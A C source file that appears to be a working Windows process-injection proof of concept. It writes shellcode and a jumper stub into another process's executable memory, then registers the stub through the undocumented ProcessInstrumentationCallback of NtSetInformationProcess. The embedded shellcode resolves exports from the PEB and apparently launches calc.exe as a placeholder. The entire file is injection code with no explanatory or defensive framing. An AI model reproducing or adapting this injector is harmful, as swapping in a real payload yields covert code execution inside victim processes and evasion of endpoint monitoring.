#include <windows.h>
#include <stdio.h>
#pragma warning(disable : 4996)

unsigned char jumper_template[49] =
{
        0x55,
        0x48, 0x89, 0xe5,
        0x48, 0xc7, 0x05, 0xf1, 0xff, 0xff, 0xff, 0x41, 0xff, 0xe2, 0x00,
        0x50,
        0x53,
        0x51,
        0x41, 0x51,
        0x41, 0x52,
        0x41, 0x53,
        0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xff, 0xd0,
        0x41, 0x5b,
        0x41, 0x5a,
        0x41, 0x59,
        0x59,
        0x5b,
        0x58,
        0x5d,
        0x41, 0xff, 0xe2
};

unsigned char buf[] =
"\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
"\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
"\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b"
"\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04"
"\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0"
"\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2"
"\x48\x83\xec\x20\x41\xff\xd6"
;

int BUFFER_Size = sizeof(buf);


#define PAGE_SIZE 0x1000
#define PAGE_ALIGN(mem) ((mem + PAGE_SIZE - 1) & (~(PAGE_SIZE - 1)))
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define ProcessInstrumentationCallback 40

typedef struct _PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION
{
    ULONG Version;
    ULONG Reserved;
    PVOID Callback;
} PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION, * PPROCESS_INSTRUMENTATION_CALLBACK_INFORMATION;

typedef NTSTATUS(NTAPI* pRtlAdjustPrivilege)(
    DWORD Privilege,
    BOOLEAN Enable,
    BOOLEAN CurrentThread,
    DWORD* OldStatus
    );
typedef NTSTATUS(NTAPI* pNtSetInformationProcess)(
    HANDLE hProcess,
    PROCESS_INFORMATION_CLASS ProcessInformationClass,
    LPVOID ProcessInformation,
    DWORD ProcessInformationSize
    );
const char* aNtSetInformationProcess = "NtSetInformationProcess";
int main()
{
    printf("Process PID: ");
    DWORD  pid;
    scanf("%d", &pid);
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess)
    {
        LPVOID mem = VirtualAllocEx(hProcess, NULL, PAGE_ALIGN(BUFFER_Size), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        LPVOID jumper = VirtualAllocEx(hProcess, NULL, PAGE_ALIGN(49), MEM_COMMIT, PAGE_EXECUTE_READWRITE);

        printf("[+] sh3llc0de addr: %p\n", mem);
        printf("[+] Jumper addr: %p\n", jumper);

        *((DWORD64*)(&(jumper_template[26]))) = (DWORD64)mem;
        BOOL check = WriteProcessMemory(hProcess, mem, buf, BUFFER_Size, NULL);
        if (check)
        {
            printf("[+] Success write sh3llc0de\n");

        }
        else {
            printf("[x] Failed to write sh3llc0de!\n");
            exit(0);
        }

        check = WriteProcessMemory(hProcess, jumper, jumper_template, 49, NULL);
        if (check)
        {
            printf("[+] Success write jumper\n");

        }
        else {
            printf("[x] Failed to write jumper!\n");
            exit(0);
        }

        PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION procinfo;
        procinfo.Reserved = 0;
        procinfo.Version = 0;
        procinfo.Callback = jumper;

        HMODULE ntdll = LoadLibraryA("NtDll");

        pNtSetInformationProcess _NtSetInformationProcess = (pNtSetInformationProcess)GetProcAddress(ntdll, aNtSetInformationProcess);

        if (_NtSetInformationProcess == NULL)
        {
            printf("[x] Failed to get NtSetInformationProcess\n");
            exit(0);
        }
        else
        {
            printf("[+] Get address of NtSetInformationProcess successfully\n");
        }
        getchar();
        getchar();
        NTSTATUS stat = _NtSetInformationProcess(hProcess, ProcessInstrumentationCallback, &procinfo, sizeof(PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION));

        if (!NT_SUCCESS(stat))
        {
            printf("[x] Failed to deploy hook!\n");
            exit(0);
        }
        else {
            printf("[+] Hook deploying successfully, waiting to be trigger...!\n");
        }
    }
    else
    {
        printf("[x] Failed to get process handle\n");
    }
}